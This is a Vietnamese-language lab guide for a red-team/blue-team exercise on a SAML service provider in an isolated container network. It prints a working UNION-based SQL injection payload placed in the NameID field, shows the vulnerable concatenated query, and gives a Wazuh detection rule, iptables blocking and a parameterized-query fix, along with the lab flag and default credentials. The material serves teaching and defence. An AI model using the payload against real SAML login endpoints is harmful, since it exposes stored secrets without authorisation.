# BÀI THỰC HÀNH: TẤN CÔNG SAML NAMEID SQL INJECTION VÀ PHÒNG THỦ SIEM WAZUH (ACTIVE RESPONSE)

---

## 1. MỤC TIÊU HỌC THUẬT

Bài thực hành giúp sinh viên ngành An toàn Thông tin và Kỹ thuật Phần mềm:
1. **Hiểu rõ luồng dữ liệu SAML 2.0 SSO**: Vai trò của các khẳng định bảo mật (Assertion) và cách Service Provider (SP) giải mã thuộc tính người dùng từ thẻ `<saml:Subject>/<saml:NameID>`.
2. **Khai thác Red Team - SQL Injection (CWE-89)**: Hiểu cách phát sinh lỗ hổng khi lập trình viên tin tưởng tuyệt đối dữ liệu trong vé SAML mà không lọc dữ liệu đầu vào hoặc sử dụng Prepared Statement. Thực hiện kỹ thuật UNION-based SQLi để trích xuất dữ liệu nhạy cảm và Secret Flag.
3. **Phòng thủ Blue Team - Giám sát SIEM Wazuh**:
   - Thu thập nhật ký ứng dụng dạng JSON từ Wazuh Agent.
   - Xây dựng Custom Decoder và Custom Rule trên Wazuh Manager nhằm phát hiện các dấu hiệu tấn công SQL Injection.
   - Thiết lập cơ chế **Active Response**: Khi cảnh báo kích hoạt, Wazuh tự động điều phối script `firewall-drop` (tương tác trực tiếp `iptables`) để chặn IP của kẻ tấn công ngay tại tầng mạng.
4. **Kiểm thử & Đánh giá tự động**: Sử dụng công cụ `checkwork` của hệ thống Labtainers để tự động đánh giá kết quả thực hành qua 5 tiêu chí độc lập.

---

## 2. MÔ HÌNH HỆ THỐNG VÀ KIẾN TRÚC MẠNG

Hệ thống gồm **03 máy ảo / container** kết nối trên mạng cục bộ `LAN1` (`172.20.0.0/24`):

```
       +-----------------------------------------------------------+
       |                  LAN1: 172.20.0.0/24                      |
       +-----------------------------+-----------------------------+
                                     |
           +-------------------------+-------------------------+
           |                         |                         |
+---------------------+   +---------------------+   +---------------------+
|      sp-server      |   |    wazuh-manager    |   |     student-pc      |
|     172.20.0.10     |   |     172.20.0.30     |   |     172.20.0.20     |
+---------------------+   +---------------------+   +---------------------+
| - Port 5000: Flask  |   | - Wazuh SIEM Server |   | - Trình duyệt Fire- |
|   SP (Dính lỗi SQLi)|   | - Syslog/JSON (514) |   |   fox & Burp Suite  |
| - Port 8080: Mock   |   | - File cấu hình     |   | - Terminal / curl   |
|   Keycloak SAML IdP |   |   local_rules.xml   |   | - Công cụ nộp flag  |
| - Wazuh Agent &     |   | - Điều phối Active  |   |   `submit_flag`     |
|   firewall-drop (IP)|   |   Response          |   | - Đánh giá kết quả: |
+---------------------+   +---------------------+   |   `checkwork`       |
                                                    +---------------------+
```

### Bảng chi tiết các nút mạng:
| Tên Container | Địa chỉ IP | Vai trò & Dịch vụ chính | Quyền hạn / Tài khoản |
| :--- | :--- | :--- | :--- |
| **`sp-server`** | `172.20.0.10` (`sp.lab`) | - Port 5000: Enterprise SAML Portal (Flask SP)<br>- Port 8080: Keycloak IAM (IdP)<br>- Wazuh Agent & iptables | `ubuntu` / `ubuntu` |
| **`wazuh-manager`** | `172.20.0.30` (`wazuh.lab`) | - Máy chủ giám sát trung tâm Wazuh SIEM<br>- Tiếp nhận log JSON cổng 514 & điều phối Active Response | `ubuntu` / `ubuntu` |
| **`student-pc`** | `172.20.0.20` | - Máy trạm kiểm thử của sinh viên<br>- Firefox, Burp Suite, Python3, lệnh `checkwork` | `ubuntu` / `ubuntu` |

---

## 3. CƠ CHẾ LỖ HỔNG (VULNERABILITY ANALYSIS)

### Nguyên nhân kỹ thuật:
Tại endpoint tiếp nhận xác thực Assertion Consumer Service (`/saml/acs`) của `sp-server`, sau khi bóc tách thẻ XML:
```python
nameid = root.xpath('//saml:Subject/saml:NameID', namespaces=ns)[0].text
```
Ứng dụng thực hiện truy vấn hồ sơ người dùng trong cơ sở dữ liệu SQLite bằng cách nối chuỗi trực tiếp:
```python
# LỖ HỔNG SQL INJECTION (CWE-89)
query = f"SELECT username, role, department, email FROM users WHERE username = '{nameid}'"
cursor.execute(query)
```
Nếu kẻ tấn công gửi giá trị `nameid` độc hại:
```sql
admin' UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --
```
Câu truy vấn thực thi trên SQLite trở thành:
```sql
SELECT username, role, department, email FROM users WHERE username = 'admin' 
UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --'
```
Kết quả: Bảng dữ liệu nhạy cảm `secret_data` (chứa Secret Flag) bị lộ trực tiếp ra giao diện web.

---

## 4. KỊCH BẢN THỰC NGHIỆM TỪNG BƯỚC

### GIAI ĐOẠN 1: KHAI THÁC SQL INJECTION & TRÍCH XUẤT CỜ (RED TEAM)

#### Bước 1.1: Truy cập Cổng dịch vụ Service Provider
1. Trên terminal của máy trạm `student-pc`, mở trình duyệt Firefox:
   ```bash
   firefox http://172.20.0.10:5000 &
   ```
2. Trang chủ **Enterprise Cloud Portal (SAML SP)** xuất hiện với giao diện trực quan.

#### Bước 1.2: Tiêm payload SQL Injection
Sinh viên có thể sử dụng 1 trong 2 cách:
- **Cách A (Trực quan qua Red Team Console trên Web):**
  - Tại trang chủ, tìm đến khung **"Bảng Kiểm Thử & Chèn Payload SAML NameID SQL Injection"**.
  - Bấm nút chọn payload mẫu:
    ```
    admin' UNION SELECT secret_key, 'Enterprise Administrator', secret_value, 'admin@corp' FROM secret_data --
    ```
  - Bấm **"Thực thi gói tin SAMLResponse"**.
- **Cách B (Sử dụng Burp Suite):**
  - Khởi động Burp Suite trên `student-pc`.
  - Thiết lập Firefox qua Proxy `127.0.0.1:8080`.
  - Bấm "Đăng nhập SAML SSO", nhập `victim` / `password123`.
  - Chặn gói tin POST `/saml/acs`, sửa thẻ `<saml:NameID>` trong chuỗi Base64 `SAMLResponse` thành payload SQLi trên.
- **Cách C (Dòng lệnh CLI):**
  - Chạy script kiểm thử trên Desktop của `student-pc`:
    ```bash
    python3 /home/ubuntu/Desktop/redteam_sqli_test.py
    ```

#### Bước 1.3: Trích xuất & Nộp cờ (Secret Flag)
1. Quan sát giao diện Dashboard hiển thị khung màu vàng nổi bật:
   ```text
   FLAG{SAML_SQLI_WAZUH_ACTIVE_RESPONSE_2026}
   ```
2. Mở terminal trên `student-pc` và nộp cờ:
   ```bash
   submit_flag FLAG{SAML_SQLI_WAZUH_ACTIVE_RESPONSE_2026}
   ```
   *(Hệ thống tự động ghi nhận đạt mục tiêu `1_sqli_executed` và `5_flag_submitted`)*.

---

### GIAI ĐOẠN 2: THIẾT LẬP GIÁM SÁT & ACTIVE RESPONSE TRÊN SIEM (BLUE TEAM)

#### Bước 2.1: Truy cập máy chủ Wazuh Manager
Chuyển sang cửa sổ terminal của `wazuh-manager` (hoặc mở terminal từ student-pc: `ssh ubuntu@172.20.0.30`).

#### Bước 2.2: Soạn thảo Custom Rule phát hiện SQL Injection
1. Mở tệp quy tắc cục bộ của Wazuh:
   ```bash
   nano /var/ossec/etc/rules/local_rules.xml
   ```
2. Thêm định nghĩa Rule sau vào bên trong thẻ `<group name="sp_portal,saml,">`:
   ```xml
   <rule id="100201" level="12">
     <match>UNION|SELECT|--</match>
     <description>SAML SQL Injection Attack Detected</description>
     <group>sqli,attack,</group>
   </rule>
   ```
3. Lưu tệp bằng cách nhấn **Ctrl + O**, nhấn **Enter**, sau đó **Ctrl + X** để thoát.

#### Bước 2.3: Kiểm tra tính hợp lệ của Rule
Chạy lệnh kiểm tra cú pháp trên `wazuh-manager`:
```bash
check_rules
```
Kết quả hiển thị `[THÀNH CÔNG] Rule phát hiện SQL Injection đã được cấu hình hợp lệ!` *(Hệ thống ghi nhận đạt mục tiêu `2_wazuh_rule_created`)*.

---

### GIAI ĐOẠN 3: KIỂM CHỨNG CƠ CHẾ CHẶN TỰ ĐỘNG (ACTIVE RESPONSE)

#### Bước 3.1: Tái diễn tấn công từ máy trạm `student-pc`
1. Đứng từ terminal của `student-pc`, thực hiện lại yêu cầu chèn payload SQLi:
   ```bash
   python3 /home/ubuntu/Desktop/redteam_sqli_test.py
   ```
   *(hoặc tải lại trang với payload SQLi trên trình duyệt)*.

#### Bước 3.2: Quan sát phản ứng tự động từ Wazuh SIEM
- `sp-server` đẩy bản ghi nhật ký JSON chứa payload sang `wazuh-manager`.
- Rule `100201` trên `wazuh-manager` kích hoạt cảnh báo mức độ 12 (Critical).
- Wazuh phát tín hiệu Active Response yêu cầu `sp-server` thực thi lệnh:
  ```bash
  /var/ossec/active-response/bin/firewall-drop add - 172.20.0.20
  ```
- Script `firewall-drop` trên `sp-server` tự động chèn rule vào `iptables`:
  ```bash
  iptables -I INPUT -s 172.20.0.20 -j DROP
  ```
  và ghi nhật ký vào `/var/ossec/logs/active-responses.log` *(Hệ thống ghi nhận đạt mục tiêu `3_active_response_triggered` và `4_attacker_blocked`)*.

#### Bước 3.3: Xác nhận máy trạm bị cô lập ở tầng mạng
Trên `student-pc`, chạy lệnh kiểm tra kết nối:
```bash
./test_connection.sh
```
**Kết quả:** Toàn bộ lệnh ping và truy cập web tới `sp-server` (`172.20.0.10`) đều bị chặn (Request timeout / Connection dropped), chứng minh IP `172.20.0.20` đã bị firewall khóa cứng!

Trên `wazuh-manager`, sinh viên có thể xem bản ghi cảnh báo:
```bash
view_alerts
```

---

### GIAI ĐOẠN 4: ĐÁNH GIÁ KẾT QUẢ TỰ ĐỘNG (CHECKWORK)

Tại terminal của máy `student-pc` (hoặc terminal Host), chạy lệnh:
```bash
checkwork saml-wazuh-sqli
```
hoặc chỉ cần gõ:
```bash
checkwork
```

**Bảng kết quả chuẩn mong đợi:**
```text
Labname saml-wazuh-sqli

Student: <email>
 Y -  1_sqli_executed
 Y -  2_wazuh_rule_created
 Y -  3_active_response_triggered
 Y -  4_attacker_blocked
 Y -  5_flag_submitted
```
Chúc mừng bạn đã hoàn thành xuất sắc toàn bộ 5/5 tiêu chí của bài thực hành!

---

## 5. GIẢI PHÁP PHÒNG THỦ TOÀN DIỆN (REMEDIATION)

Để vá lỗ hổng triệt để ở tầng mã nguồn ứng dụng:
1. **Prepared Statements / Parameterized Queries**:
   ```python
   # KHẮC PHỤC CHUẨN: Sử dụng tham số hóa truy vấn
   query = "SELECT username, role, department, email FROM users WHERE username = ?"
   cursor.execute(query, (nameid,))
   ```
2. **Nguyên tắc đặc quyền tối thiểu (Least Privilege)**: Phân quyền tài khoản cơ sở dữ liệu chỉ có quyền đọc các bảng cần thiết, không có quyền đọc bảng cấu hình hoặc bảng bí mật hệ thống.
3. **Phòng thủ theo chiều sâu (Defense-in-Depth)**: Kết hợp SIEM (Wazuh) để phát hiện và cô lập tức thời địa chỉ IP có hành vi khai thác bất thường.
